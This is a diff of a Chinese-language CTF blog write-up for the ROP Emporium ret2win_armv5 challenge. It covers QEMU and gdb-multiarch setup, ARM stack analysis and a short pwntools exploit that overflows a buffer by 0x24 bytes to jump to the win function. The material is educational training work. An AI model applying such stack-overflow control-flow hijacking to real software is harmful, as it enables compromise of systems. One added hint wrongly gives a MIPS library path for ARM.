@@ -136,19 +136,20 @@
 
 
 <h3 id="0x03-ret2win-armv5"><a href="#0x03-ret2win-armv5" class="headerlink" title="0x03 ret2win_armv5"></a>0x03 ret2win_armv5</h3><p>虽然不是第一次见到异构pwn题，但是是第一次做，所以这里记录一下基本的环境配置步骤和arm汇编相关的知识，但不会深入展开，主打一个够用就行。</p>
-<h5 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install gdb-multiarch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential gcc-arm-linux-gnueabi</span></span><br></pre></td></tr></table></figure>
+<h5 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install gdb-multiarch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential gcc-arm-linux-gnueabi libc6-armel-cross</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">ln</span> -s /usr/arm-linux-gnueabi /etc/qemu-binfmt/arm</span></span><br></pre></td></tr></table></figure>
 
-<h5 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h5><p>如果想要在终端运行arm架构的程序，那就用以下命令(-L是为了加载动态链接库)</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static -L /usr/arm-linux-gnueabi/ ./your_exec_file</span></span><br></pre></td></tr></table></figure>
+<h5 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h5><p>如果想要在终端运行arm架构的程序，那就用以下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static ./your_exec_file</span></span><br></pre></td></tr></table></figure>
 
+<p>如果找不到动态链接库，就加个<code>-L /usr/mipsel-linux-gnu/</code>在中间就行，调试同理。</p>
 <h5 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h5><p>如果想要调试arm架构的程序，使用以下命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static -g 9999 -L /usr/arm-linux-gnueabi/ ./your_exec_file</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static -g 9999 ./your_exec_file</span></span><br></pre></td></tr></table></figure>
 
 <p>然后打开另一个终端，输入</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q ./your_exec_file</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> solib-search-path /usr/arm-linux-gnueabi/lib/</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :9999</span></span><br></pre></td></tr></table></figure>
 
 <p>上面的9999是端口，数字可以自己定。第三行命令是为了让gdb找到动态链接库。如果是aarch64架构的，也是一样的操作，换一下动态链接库路径为&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;lib&#x2F;即可。</p>
-<h5 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h5><p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\ROPEmporium\ret2win_armv5汇编代码.png" alt="ret2win_armv5汇编代码"></p>
+<h5 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h5><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81.png" alt="ret2win_armv5汇编代码"></p>
 <p>首先先看看arm寄存器方面和x86的不同之处。</p>
 <ul>
 <li>32位的arm有13个通用寄存器，分别是R0-R12。</li>
@@ -165,12 +166,12 @@
 <p>调用read的时候把第一个参数放到了R0，第二个参数是R11-0x24，放到了R1，第三个参数在R2。从这里可以确认的一点是我们输入的地方距离存放LR的地方隔了0x24。所以填充0x24padding再写个ret2win的地址，我们就算是利用栈溢出劫持了程序执行流。</p>
 <p>函数结束之后先将R11-4赋给了SP，再分别将R11和PC出栈。那么这时，PC寄存器里地址就是我们写入的ret2win的函数地址。</p>
 <h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>因为是第一次做arm的pwn题，我们还是详细调试一下看看，加深理解。首先我们开启gdb-multiarch之后，连接qemu端口，设置好动态链接库。之后断点在pwnme函数，再往后就单步执行看栈和寄存器变化就可以了。</p>
-<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\ROPEmporium\ret2win_armv5调试0.png" alt="ret2win_armv5调试0"></p>
-<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\ROPEmporium\ret2win_armv5调试1.png" alt="ret2win_armv5调试1"></p>
-<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\ROPEmporium\ret2win_armv5调试2.png" alt="ret2win_armv5调试2"></p>
-<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\ROPEmporium\ret2win_armv5调试3.png" alt="ret2win_armv5调试3"></p>
-<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\ROPEmporium\ret2win_armv5调试4.png" alt="ret2win_armv5调试4"></p>
-<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\ROPEmporium\ret2win_armv5调试5.png" alt="ret2win_armv5调试5"></p>
+<p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%950.png" alt="ret2win_armv5调试0"></p>
+<p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%951.png" alt="ret2win_armv5调试1"></p>
+<p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%952.png" alt="ret2win_armv5调试2"></p>
+<p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%953.png" alt="ret2win_armv5调试3"></p>
+<p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%954.png" alt="ret2win_armv5调试4"></p>
+<p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%955.png" alt="ret2win_armv5调试5"></p>
 <h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x105EC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -187,7 +188,9 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q ./your_exec_file</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> solib-search-path /usr/mipsel-linux-gnu/lib/</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :9999</span></span><br></pre></td></tr></table></figure>
 
 <p>和arm调试是一样的。</p>
-<h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5>
+<h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*To be continued...*/</span></span><br></pre></td></tr></table></figure>
+
+
 											<div class="article-footer-copyright">
 
     本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
